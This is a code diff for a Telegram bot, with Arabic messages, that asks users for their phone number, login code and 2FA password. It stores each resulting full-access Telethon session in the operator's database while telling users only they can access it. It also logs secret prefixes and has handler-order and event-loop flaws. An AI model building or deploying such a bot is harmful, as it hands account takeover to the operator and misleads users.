@@ -3,10 +3,11 @@ import asyncio
 import logging
 from telethon import TelegramClient, sessions
 from telethon.errors import SessionPasswordNeededError
-from telebot.async_telebot import AsyncTeleBot
+import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import pymongo
 from datetime import datetime
+import threading
 
 # ==================== المتغيرات البيئية ====================
 TOKEN = os.environ.get("TOKEN")
@@ -15,27 +16,37 @@ API_HASH = os.environ.get("API_HASH")
 MONGO_URL = os.environ.get("MONGO_URL")
 
 if not all([TOKEN, API_ID, API_HASH, MONGO_URL]):
+    print("⚠️ المتغيرات البيئية ناقصة!")
+    print(f"TOKEN: {'✅' if TOKEN else '❌'}")
+    print(f"API_ID: {'✅' if API_ID else '❌'}")
+    print(f"API_HASH: {'✅' if API_HASH else '❌'}")
+    print(f"MONGO_URL: {'✅' if MONGO_URL else '❌'}")
     raise ValueError("⚠️ المتغيرات البيئية ناقصة!")
 
 API_ID = int(API_ID)
 
 # ==================== اتصال MongoDB ====================
-client_mongo = pymongo.MongoClient(MONGO_URL)
-db = client_mongo["telegram_sessions"]
-collection = db["sessions"]
+try:
+    client_mongo = pymongo.MongoClient(MONGO_URL)
+    db = client_mongo["telegram_sessions"]
+    collection = db["sessions"]
+    print("✅ اتصال MongoDB ناجح")
+except Exception as e:
+    print(f"❌ فشل اتصال MongoDB: {e}")
+    raise
 
 # ==================== إعداد البوت ====================
-bot = AsyncTeleBot(TOKEN)
+bot = telebot.TeleBot(TOKEN)
 logging.basicConfig(level=logging.INFO)
 
 user_data = {}
 
 # ==================== الأوامر ====================
 @bot.message_handler(commands=['start'])
-async def start(message):
+def start(message):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
-    await bot.send_message(message.chat.id, 
+    bot.send_message(message.chat.id, 
                      "⚠️ **تحذير:** ملف الجلسة يمنح وصول كامل لحسابك.\n"
                      "لا ترسله لأي شخص.\n\n"
                      "📌 الأوامر المتاحة:\n"
@@ -46,10 +57,10 @@ async def start(message):
                      reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['gensession'])
-async def gen_session(message):
+def gen_session(message):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("✅ موافق وشروط الاستخدام", callback_data="agree"))
-    await bot.send_message(message.chat.id, 
+    bot.send_message(message.chat.id, 
                      "⚠️ **تنبيه أمان:**\n"
                      "سيتم إنشاء جلسة جديدة وحفظها في قاعدة البيانات.\n"
                      "أنت وحدك من يستطيع الوصول إليها.\n\n"
@@ -57,26 +68,30 @@ async def gen_session(message):
                      reply_markup=markup, parse_mode='Markdown')
 
 @bot.callback_query_handler(func=lambda call: call.data == "agree")
-async def agree(call):
-    await bot.answer_callback_query(call.id)
-    msg = await bot.send_message(call.message.chat.id, 
+def agree(call):
+    bot.answer_callback_query(call.id)
+    msg = bot.send_message(call.message.chat.id, 
                           "📱 أرسل رقم هاتفك مع المفتاح الدولي\n"
                           "مثال: `+966501234567`\n\n"
                           "أو اضغط /cancel للإلغاء", 
                           parse_mode='Markdown')
-    await bot.register_next_step_handler(msg, get_phone)
+    bot.register_next_step_handler(msg, get_phone)
 
-async def get_phone(message):
+def get_phone(message):
     if message.text == '/cancel':
-        await bot.send_message(message.chat.id, "❌ تم الإلغاء.")
+        bot.send_message(message.chat.id, "❌ تم الإلغاء.")
         return
     
     phone = message.text.strip()
     chat_id = message.chat.id
     user_data[chat_id] = {'phone': phone}
     
-    await bot.send_message(chat_id, "⏳ جاري إرسال رمز التحقق...")
-    await send_code(chat_id, phone)
+    bot.send_message(chat_id, "⏳ جاري إرسال رمز التحقق...")
+    # تشغيل الدالة غير المتزامنة في thread منفصل
+    threading.Thread(target=run_async_send_code, args=(chat_id, phone)).start()
+
+def run_async_send_code(chat_id, phone):
+    asyncio.run(send_code(chat_id, phone))
 
 async def send_code(chat_id, phone):
     try:
@@ -85,18 +100,21 @@ async def send_code(chat_id, phone):
         result = await client.send_code_request(phone)
         user_data[chat_id]['client'] = client
         user_data[chat_id]['phone_code_hash'] = result.phone_code_hash
-        await bot.send_message(chat_id, "🔑 أرسل رمز التحقق (5 أرقام) الذي وصل إليك في Telegram:")
+        bot.send_message(chat_id, "🔑 أرسل رمز التحقق (5 أرقام) الذي وصل إليك في Telegram:")
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ فشل الإرسال: {str(e)}")
+        bot.send_message(chat_id, f"❌ فشل الإرسال: {str(e)}")
 
 @bot.message_handler(func=lambda m: True)
-async def handle_code(message):
+def handle_code(message):
     chat_id = message.chat.id
     if chat_id not in user_data or 'client' not in user_data[chat_id]:
-        await bot.send_message(chat_id, "❌ ابدأ من جديد بـ /gensession")
+        bot.send_message(chat_id, "❌ ابدأ من جديد بـ /gensession")
         return
     code = message.text.strip()
-    await complete_auth(chat_id, code)
+    threading.Thread(target=run_async_complete_auth, args=(chat_id, code)).start()
+
+def run_async_complete_auth(chat_id, code):
+    asyncio.run(complete_auth(chat_id, code))
 
 async def complete_auth(chat_id, code):
     client = user_data[chat_id]['client']
@@ -117,7 +135,7 @@ async def complete_auth(chat_id, code):
         }
         collection.insert_one(session_data)
         
-        await bot.send_message(chat_id, 
+        bot.send_message(chat_id, 
                         f"✅ **تم حفظ جلسة جديدة!**\n\n"
                         f"📱 الرقم: `{phone}`\n\n"
                         f"🔑 **جلسة النص (String Session):**\n"
@@ -127,43 +145,49 @@ async def complete_auth(chat_id, code):
                         parse_mode='Markdown')
         del user_data[chat_id]
     except SessionPasswordNeededError:
-        await bot.send_message(chat_id, "🔐 حسابك مفعل بـ 2FA. أرسل كلمة المرور:")
+        bot.send_message(chat_id, "🔐 حسابك مفعل بـ 2FA. أرسل كلمة المرور:")
         user_data[chat_id]['step'] = '2fa'
     except Exception as e:
-        await bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
+        bot.send_message(chat_id, f"❌ خطأ: {str(e)}")
         await client.disconnect()
 
 @bot.message_handler(commands=['mysessions'])
-async def my_sessions(message):
+def my_sessions(message):
     chat_id = message.chat.id
     sessions_list = list(collection.find({"user_id": chat_id, "is_active": True}))
     if not sessions_list:
-        await bot.send_message(chat_id, "📭 لا توجد جلسات محفوظة.")
+        bot.send_message(chat_id, "📭 لا توجد جلسات محفوظة.")
         return
     text = "📋 **جلساتك المحفوظة:**\n\n"
     for i, sess in enumerate(sessions_list, 1):
         text += f"{i}. 📱 {sess['phone']}\n"
         text += f"   🆔 `{sess['_id']}`\n"
         text += f"   📅 {sess['created_at'].strftime('%Y-%m-%d %H:%M')}\n\n"
-    await bot.send_message(chat_id, text, parse_mode='Markdown')
+    bot.send_message(chat_id, text, parse_mode='Markdown')
 
 @bot.message_handler(commands=['revoke'])
-async def revoke_session(message):
+def revoke_session(message):
     chat_id = message.chat.id
     parts = message.text.split()
     if len(parts) < 2:
-        await bot.send_message(chat_id, "❌ أرسل المعرف المراد حذفه:\n`/revoke 65f3a1b2...`", parse_mode='Markdown')
+        bot.send_message(chat_id, "❌ أرسل المعرف المراد حذفه:\n`/revoke 65f3a1b2...`", parse_mode='Markdown')
         return
     session_id = parts[1]
     result = collection.delete_one({"_id": session_id, "user_id": chat_id})
     if result.deleted_count > 0:
-        await bot.send_message(chat_id, "✅ تم حذف الجلسة بنجاح.")
+        bot.send_message(chat_id, "✅ تم حذف الجلسة بنجاح.")
     else:
-        await bot.send_message(chat_id, "❌ لم أجد جلسة بهذا المعرف.")
+        bot.send_message(chat_id, "❌ لم أجد جلسة بهذا المعرف.")
 
 # ==================== تشغيل البوت ====================
-async def main():
-    await bot.polling()
-
 if __name__ == "__main__":
-    asyncio.run(main())
+    print("🚀 بدء تشغيل البوت...")
+    print(f"✅ TOKEN: {TOKEN[:10]}...")
+    print(f"✅ API_ID: {API_ID}")
+    print(f"✅ API_HASH: {API_HASH[:10]}...")
+    print(f"✅ MONGO_URL: {MONGO_URL[:30]}...")
+    
+    try:
+        bot.polling(none_stop=True, interval=0)
+    except Exception as e:
+        print(f"❌ خطأ في البوت: {e}")
